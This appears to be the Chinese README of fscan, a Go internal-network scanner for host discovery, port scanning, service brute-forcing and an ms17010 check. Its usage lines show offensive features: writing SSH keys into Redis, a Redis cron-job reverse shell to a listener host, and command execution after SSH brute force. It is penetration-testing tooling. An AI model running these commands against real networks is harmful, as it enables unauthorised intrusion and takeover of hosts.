# fscan

一款内网扫描工具，方便一键大保健。  
支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。  
趁着最近有空，用go把f-scrack重构了一遍。使用go来编写，也有更好的扩展性及兼容性。  
还在逐步增加功能，欢迎各位师傅提意见。

## usege
``` 
go run main.go -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写私钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
```

`fscan.exe -h 192.168.x.x`
![](image/1.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写私钥)`
![](image/2.png)


`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](image/3.png)


`fscan.exe -h 192.168.x.x (ms17010、读取网卡信息)`
![](image/4.png)


## 参考链接
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   